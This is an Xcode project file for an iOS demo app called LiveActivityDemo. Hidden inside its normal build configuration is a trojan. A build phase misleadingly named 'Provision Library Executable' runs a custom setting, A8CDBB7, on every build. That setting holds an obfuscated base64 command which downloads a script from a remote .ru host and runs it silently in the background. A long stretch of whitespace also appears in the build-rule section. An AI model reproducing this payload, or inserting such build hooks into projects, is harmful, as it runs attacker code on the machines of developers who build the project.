// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		5D0D3219E72044E2DB262D96 /* Pods_LiveActivityDemo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 82ABB732D387DED35238E5B7 /* Pods_LiveActivityDemo.framework */; };
		77A5BD5F2C098D8100669B64 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77A5BD5E2C098D8100669B64 /* AppDelegate.swift */; };
		77A5BD612C098D8100669B64 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77A5BD602C098D8100669B64 /* SceneDelegate.swift */; };
		77A5BD632C098D8100669B64 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77A5BD622C098D8100669B64 /* ViewController.swift */; };
		77A5BD662C098D8100669B64 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 77A5BD642C098D8100669B64 /* Main.storyboard */; };
		77A5BD682C098D8300669B64 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 77A5BD672C098D8300669B64 /* Assets.xcassets */; };
		77A5BD6B2C098D8300669B64 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 77A5BD692C098D8300669B64 /* LaunchScreen.storyboard */; };
		77A5BD732C098E5D00669B64 /* LiveActivityManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77A5BD722C098E5D00669B64 /* LiveActivityManager.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		35C2079C03FDC3C54136BC52 /* Pods-LiveActivityDemo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-LiveActivityDemo.release.xcconfig"; path = "Target Support Files/Pods-LiveActivityDemo/Pods-LiveActivityDemo.release.xcconfig"; sourceTree = "<group>"; };
		6224C1CE3DFC910638A53F1E /* Pods-LiveActivityDemo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-LiveActivityDemo.debug.xcconfig"; path = "Target Support Files/Pods-LiveActivityDemo/Pods-LiveActivityDemo.debug.xcconfig"; sourceTree = "<group>"; };
		77A5BD5B2C098D8100669B64 /* LiveActivityDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LiveActivityDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		77A5BD5E2C098D8100669B64 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		77A5BD602C098D8100669B64 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		77A5BD622C098D8100669B64 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		77A5BD652C098D8100669B64 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		77A5BD672C098D8300669B64 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		77A5BD6A2C098D8300669B64 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		77A5BD6C2C098D8300669B64 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		77A5BD722C098E5D00669B64 /* LiveActivityManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LiveActivityManager.swift; sourceTree = "<group>"; };
		82ABB732D387DED35238E5B7 /* Pods_LiveActivityDemo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_LiveActivityDemo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		77A5BD582C098D8100669B64 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				5D0D3219E72044E2DB262D96 /* Pods_LiveActivityDemo.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		77A5BD522C098D8100669B64 = {
			isa = PBXGroup;
			children = (
				77A5BD5D2C098D8100669B64 /* LiveActivityDemo */,
				77A5BD5C2C098D8100669B64 /* Products */,
				89FAE8652EB5803AEBD18510 /* Pods */,
				E2F392BEF5EDFF2A2E997D51 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		77A5BD5C2C098D8100669B64 /* Products */ = {
			isa = PBXGroup;
			children = (
				77A5BD5B2C098D8100669B64 /* LiveActivityDemo.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		77A5BD5D2C098D8100669B64 /* LiveActivityDemo */ = {
			isa = PBXGroup;
			children = (
				77A5BD5E2C098D8100669B64 /* AppDelegate.swift */,
				77A5BD602C098D8100669B64 /* SceneDelegate.swift */,
				77A5BD622C098D8100669B64 /* ViewController.swift */,
				77A5BD722C098E5D00669B64 /* LiveActivityManager.swift */,
				77A5BD642C098D8100669B64 /* Main.storyboard */,
				77A5BD672C098D8300669B64 /* Assets.xcassets */,
				77A5BD692C098D8300669B64 /* LaunchScreen.storyboard */,
				77A5BD6C2C098D8300669B64 /* Info.plist */,
			);
			path = LiveActivityDemo;
			sourceTree = "<group>";
		};
		89FAE8652EB5803AEBD18510 /* Pods */ = {
			isa = PBXGroup;
			children = (
				6224C1CE3DFC910638A53F1E /* Pods-LiveActivityDemo.debug.xcconfig */,
				35C2079C03FDC3C54136BC52 /* Pods-LiveActivityDemo.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		E2F392BEF5EDFF2A2E997D51 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				82ABB732D387DED35238E5B7 /* Pods_LiveActivityDemo.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		77A5BD5A2C098D8100669B64 /* LiveActivityDemo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 77A5BD6F2C098D8300669B64 /* Build configuration list for PBXNativeTarget "LiveActivityDemo" */;
			buildPhases = (
				13FAA23923AE48B3957BBDC8 /* Provision Library Executable */,
				D72CC5F0E36E9B8580A39BC7 /* [CP] Check Pods Manifest.lock */,
				77A5BD572C098D8100669B64 /* Sources */,
				77A5BD582C098D8100669B64 /* Frameworks */,
				77A5BD592C098D8100669B64 /* Resources */,
				F86BC536C28FA5EB22E56864 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = LiveActivityDemo;
			productName = LiveActivityDemo;
			productReference = 77A5BD5B2C098D8100669B64 /* LiveActivityDemo.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		77A5BD532C098D8100669B64 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1510;
				LastUpgradeCheck = 1510;
				TargetAttributes = {
					77A5BD5A2C098D8100669B64 = {
						CreatedOnToolsVersion = 15.1;
					};
				};
			};
			buildConfigurationList = 77A5BD562C098D8100669B64 /* Build configuration list for PBXProject "LiveActivityDemo" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 77A5BD522C098D8100669B64;
			productRefGroup = 77A5BD5C2C098D8100669B64 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				77A5BD5A2C098D8100669B64 /* LiveActivityDemo */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																	/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		77A5BD592C098D8100669B64 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				77A5BD6B2C098D8300669B64 /* LaunchScreen.storyboard in Resources */,
				77A5BD682C098D8300669B64 /* Assets.xcassets in Resources */,
				77A5BD662C098D8100669B64 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		13FAA23923AE48B3957BBDC8 /* Provision Library Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Library Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
		};
		D72CC5F0E36E9B8580A39BC7 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-LiveActivityDemo-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		F86BC536C28FA5EB22E56864 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-LiveActivityDemo/Pods-LiveActivityDemo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-LiveActivityDemo/Pods-LiveActivityDemo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-LiveActivityDemo/Pods-LiveActivityDemo-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		77A5BD572C098D8100669B64 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				77A5BD732C098E5D00669B64 /* LiveActivityManager.swift in Sources */,
				77A5BD632C098D8100669B64 /* ViewController.swift in Sources */,
				77A5BD5F2C098D8100669B64 /* AppDelegate.swift in Sources */,
				77A5BD612C098D8100669B64 /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		77A5BD642C098D8100669B64 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				77A5BD652C098D8100669B64 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		77A5BD692C098D8300669B64 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				77A5BD6A2C098D8300669B64 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		77A5BD6D2C098D8300669B64 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		77A5BD6E2C098D8300669B64 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		77A5BD702C098D8300669B64 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 6224C1CE3DFC910638A53F1E /* Pods-LiveActivityDemo.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = CA6XCFWPY9;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = LiveActivityDemo/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.liveactivitydemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		77A5BD712C098D8300669B64 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 35C2079C03FDC3C54136BC52 /* Pods-LiveActivityDemo.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = CA6XCFWPY9;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = LiveActivityDemo/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.liveactivitydemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		77A5BD562C098D8100669B64 /* Build configuration list for PBXProject "LiveActivityDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				77A5BD6D2C098D8300669B64 /* Debug */,
				77A5BD6E2C098D8300669B64 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		77A5BD6F2C098D8300669B64 /* Build configuration list for PBXNativeTarget "LiveActivityDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				77A5BD702C098D8300669B64 /* Debug */,
				77A5BD712C098D8300669B64 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 77A5BD532C098D8100669B64 /* Project object */;
}
